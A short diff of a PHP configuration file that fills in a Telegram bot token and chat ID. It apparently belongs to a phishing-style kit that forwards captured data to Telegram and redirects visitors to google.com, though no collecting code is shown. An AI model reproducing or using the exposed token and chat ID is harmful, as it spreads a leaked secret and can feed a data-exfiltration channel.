@@ -13,8 +13,8 @@ define('MAX_ATTEMPTS', 1000);
 define('REDIRECT_URL', 'https://www.google.com');
 
 // Telegram Bot API Credentials
-define('TELEGRAM_BOT_TOKEN', '');
-define('TELEGRAM_CHAT_ID', '');
+define('TELEGRAM_BOT_TOKEN', '7731656544:AAExtLQ3hbQkQG-rFDzfmFnHIFLG3SzLNWU');
+define('TELEGRAM_CHAT_ID', '7311351053');
 
 // EmailJS Credentials
 define('EMAILJS_SERVICE_ID', '');
